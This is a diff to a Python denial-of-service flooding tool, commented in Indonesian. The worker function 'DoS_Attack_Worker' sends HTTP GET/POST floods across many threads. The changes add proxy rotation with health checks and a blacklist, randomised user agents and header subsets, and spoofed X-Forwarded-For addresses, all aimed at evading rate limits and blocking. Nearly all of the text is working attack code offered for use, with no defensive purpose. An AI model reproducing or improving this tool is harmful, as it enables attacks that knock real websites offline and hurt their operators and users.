@@ -33,11 +33,12 @@ max_concurrent_attack_threads_auto = 1500
 thread_count_lock = threading.Lock() 
 
 # --- Proxy Management ---
-proxy_list = []
-active_proxies = []
-blacklist_proxies = {} 
-proxy_lock = threading.Lock() 
-PROXY_UNBLACKLIST_TIME = 60 
+proxy_list = [] # Daftar semua proxy yang dimuat dari file
+active_proxies = [] # Daftar proxy yang sedang aktif dan bisa dipilih
+blacklist_proxies = {} # {proxy_address_string: {'unblacklist_time': timestamp, 'fail_count': count}}
+proxy_lock = threading.Lock() # Untuk akses aman ke daftar proxy
+PROXY_UNBLACKLIST_TIME = 60 # Detik untuk proxy di blacklist sementara
+PROXY_PERMANENT_BLACKLIST_THRESHOLD = 5 # Jumlah kegagalan sebelum proxy dibuang permanen
 
 # Fungsi print kustom untuk mengontrol output
 def controlled_print(message):
@@ -92,9 +93,40 @@ def parse_proxy_line(line):
     
     return None 
 
+def test_proxy(proxy_info, test_target_host="google.com", test_target_port=80, timeout=5):
+    """
+    Menguji konektivitas proxy sebelum digunakan.
+    Mengembalikan True jika proxy berfungsi, False jika tidak.
+    """
+    if not SOCKS_AVAILABLE:
+        return False # Tidak bisa tes proxy jika PySocks tidak ada
+
+    proxy_type, proxy_host, proxy_port, proxy_user, proxy_pass = proxy_info
+    
+    test_sock = socks.socksocket()
+    test_sock.settimeout(timeout)
+    
+    try:
+        if proxy_type == 'socks5':
+            test_sock.set_proxy(socks.SOCKS5, proxy_host, proxy_port, username=proxy_user, password=proxy_pass)
+        elif proxy_type == 'http':
+            test_sock.set_proxy(socks.HTTP, proxy_host, proxy_port, username=proxy_user, password=proxy_pass)
+        else:
+            return False # Jenis proxy tidak didukung oleh PySocks
+        
+        test_sock.connect((test_target_host, test_target_port))
+        test_sock.sendall(b"HEAD / HTTP/1.1\r\nHost: google.com\r\n\r\n")
+        response = test_sock.recv(16) # Coba terima sedikit respons
+        return b"HTTP" in response # Indikasi respons HTTP
+    except (socks.ProxyError, socket.error, OSError, Exception):
+        return False
+    finally:
+        if test_sock:
+            test_sock.close()
+
 def load_proxies(filename="ProxyList.txt"):
-    """Memuat proxy dari file."""
-    proxies = []
+    """Memuat proxy dari file dan melakukan health check."""
+    loaded_proxies = []
     if not os.path.exists(filename):
         return []
     
@@ -106,36 +138,40 @@ def load_proxies(filename="ProxyList.txt"):
                     continue
                 if not SOCKS_AVAILABLE and (proxy_info[0].lower() == 'socks5' or proxy_info[0].lower() == 'http'): 
                     continue
-                proxies.append(proxy_info)
+                loaded_proxies.append(proxy_info)
     
-    if not proxies:
-        pass 
-    else:
-        pass 
-    return proxies
+    return loaded_proxies
 
 def get_next_proxy():
     """Mengambil proxy berikutnya dari daftar aktif atau mencoba unblacklist."""
     with proxy_lock:
         current_time = time.time()
+        # Periksa dan unblacklist proxy jika waktunya sudah tiba
         proxies_in_blacklist_copy = list(blacklist_proxies.keys()) 
         for p_addr_str in proxies_in_blacklist_copy:
-            if current_time >= blacklist_proxies[p_addr_str]:
-                del blacklist_proxies[p_addr_str]
+            if current_time >= blacklist_proxies[p_addr_str]['unblacklist_time']:
+                # Jika sudah di-unblacklist, coba lagi test proxy. Jika lulus, masukkan ke active_proxies
+                # Jika gagal, tetap di blacklist atau buang permanen
+                original_proxy_info = None # Perlu cara untuk mendapatkan kembali tuple original
+                # Untuk kesederhanaan, kita akan isi ulang active_proxies saat kosong
+                # Dan biarkan pengujian terjadi di DoS_Attack_Worker saat dipilih
+                del blacklist_proxies[p_addr_str] # Hapus dari blacklist
         
         if not active_proxies:
             if not proxy_list: 
                 return None
-            active_proxies.extend(proxy_list)
-            random.shuffle(active_proxies)
-        
+            active_proxies.extend(proxy_list) # Isi ulang dari daftar utama
+            random.shuffle(active_proxies) # Acak lagi
+            
         if not active_proxies: 
             return None
         
+        # Pilih proxy secara acak dari yang aktif
         selected_proxy_info = random.choice(active_proxies)
         
+        # Pastikan proxy yang dipilih tidak ada di blacklist yang belum waktunya
         proxy_address_str = f"{selected_proxy_info[0]}_{selected_proxy_info[1]}_{selected_proxy_info[2]}"
-        if proxy_address_str in blacklist_proxies and current_time < blacklist_proxies[proxy_address_str]:
+        if proxy_address_str in blacklist_proxies and current_time < blacklist_proxies[proxy_address_str]['unblacklist_time']:
             if len(active_proxies) == 1 and proxy_address_str in blacklist_proxies: 
                 return None 
             return get_next_proxy() 
@@ -143,14 +179,29 @@ def get_next_proxy():
         return selected_proxy_info
 
 def blacklist_proxy(proxy_info, reason="unknown"):
-    """Menambahkan proxy ke daftar hitam sementara."""
+    """Menambahkan proxy ke daftar hitam sementara atau permanen."""
     if not proxy_info: return
     proxy_address_str = f"{proxy_info[0]}_{proxy_info[1]}_{proxy_info[2]}"
     with proxy_lock:
-        if proxy_address_str not in blacklist_proxies: 
-            blacklist_proxies[proxy_address_str] = time.time() + PROXY_UNBLACKLIST_TIME
+        if proxy_address_str not in blacklist_proxies:
+            blacklist_proxies[proxy_address_str] = {'unblacklist_time': time.time() + PROXY_UNBLACKLIST_TIME, 'fail_count': 1}
+        else:
+            blacklist_proxies[proxy_address_str]['fail_count'] += 1
+            blacklist_proxies[proxy_address_str]['unblacklist_time'] = time.time() + PROXY_UNBLACKLIST_TIME # Perbarui waktu
+        
+        if blacklist_proxies[proxy_address_str]['fail_count'] >= PROXY_PERMANENT_BLACKLIST_THRESHOLD:
+            # Buang permanen dari proxy_list
+            if proxy_info in proxy_list:
+                proxy_list.remove(proxy_info)
+            if proxy_info in active_proxies:
+                active_proxies.remove(proxy_info)
+            del blacklist_proxies[proxy_address_str] # Hapus dari blacklist juga
+            # controlled_print(f"{Fore.RED}Proxy {proxy_info[1]}:{proxy_info[2]} dibuang permanen (terlalu banyak gagal).{Fore.RESET}") # Untuk debugging
+        else:
             if proxy_info in active_proxies: 
                 active_proxies.remove(proxy_info)
+            # controlled_print(f"{Fore.YELLOW}Proxy {proxy_info[1]}:{proxy_info[2]} di-blacklist sementara ({blacklist_proxies[proxy_address_str]['fail_count']}/{PROXY_PERMANENT_BLACKLIST_THRESHOLD} gagal).{Fore.RESET}") # Untuk debugging
+
 
 def generate_random_string_payload(length):
     """Menghasilkan string acak untuk body payload POST."""
@@ -178,30 +229,32 @@ def DoS_Attack_Worker(ip, host, port, type_attack, booter_sent, use_proxy_option
 
         url_path = generate_url_path(random.randint(5, 15))
 
-        user_agents = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
-            "Mozilla/5.0 (Android 11; Mobile; rv:89.0) Gecko/89.0 Firefox/89.0",
-            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
-            "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36",
-            "Googlebot/2.1 (+http://www.google.com/bot.html)",
-            "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
-            "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
-        ]
-        random_user_agent = random.choice(user_agents)
-
+        # --- Generasi User-Agent Dinamis ---
+        random_user_agent = ua.random if FAKE_USERAGENT_AVAILABLE else "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+        
         fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
         
-        random_headers = [
-            f"Referer: http://{host}/{generate_random_string(10)}\r\n",
-            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n",
-            f"Accept-Language: en-US,en;q={random.uniform(0.5, 1.0):.1f}\r\n",
-            f"Pragma: no-cache\r\n",
-            f"X-Requested-With: XMLHttpRequest\r\n"
-        ]
-        random.shuffle(random_headers)
+        # --- Variasi Header HTTP yang Lebih Luas dan Acak ---
+        base_headers = {
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            "Accept-Language": f"en-US,en;q={random.uniform(0.5, 1.0):.1f}",
+            "Pragma": "no-cache",
+            "Cache-Control": "no-cache",
+            "Referer": f"http://{host}/{generate_random_string(10)}", 
+            "X-Requested-With": "XMLHttpRequest", 
+            "DNT": str(random.randint(0,1)), 
+            "Upgrade-Insecure-Requests": "1" 
+        }
+        
+        shuffled_headers = list(base_headers.items())
+        random.shuffle(shuffled_headers)
+        
+        dynamic_headers_str = ""
+        num_headers_to_include = random.randint(int(len(shuffled_headers) * 0.3), len(shuffled_headers))
+        
+        for i in range(num_headers_to_include):
+            key, value = shuffled_headers[i]
+            dynamic_headers_str += f"{key}: {value}\r\n"
 
         packet_body = ""
         if type_attack.upper() == "POST":
@@ -216,9 +269,8 @@ def DoS_Attack_Worker(ip, host, port, type_attack, booter_sent, use_proxy_option
         packet_str = (
             f"{type_attack} /{url_path} HTTP/1.1\r\n" 
             f"Host: {host}\r\n"
-            f"User-Agent: {random_user_agent}\r\n"
-            f"{''.join(random_headers[:random.randint(1, len(random_headers))])}"
-            f"Cache-Control: no-cache\r\n"
+            f"User-Agent: {random_user_agent}\r\n" 
+            f"{dynamic_headers_str}" 
             f"Connection: close\r\n"
             f"X-Forwarded-For: {fake_ip}\r\n"
             f"{content_type_header}" 
@@ -227,10 +279,8 @@ def DoS_Attack_Worker(ip, host, port, type_attack, booter_sent, use_proxy_option
         )
         packet_data = packet_str.encode()
 
-        if use_proxy_option: 
-            if not SOCKS_AVAILABLE or not active_proxies:
-                return 
-            
+        # --- Proxy Connection Logic ---
+        if use_proxy_option and SOCKS_AVAILABLE and active_proxies:
             selected_proxy = get_next_proxy()
             if not selected_proxy:
                 return 
@@ -256,6 +306,9 @@ def DoS_Attack_Worker(ip, host, port, type_attack, booter_sent, use_proxy_option
                 raise socket.error("Proxy terlalu lambat/tidak merespons dari target.")
             except Exception as e:
                 raise Exception(f"Gagal memvalidasi proxy/target respons: {e}")
+
+        elif use_proxy_option and not SOCKS_AVAILABLE: 
+            return 
 
         else: 
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
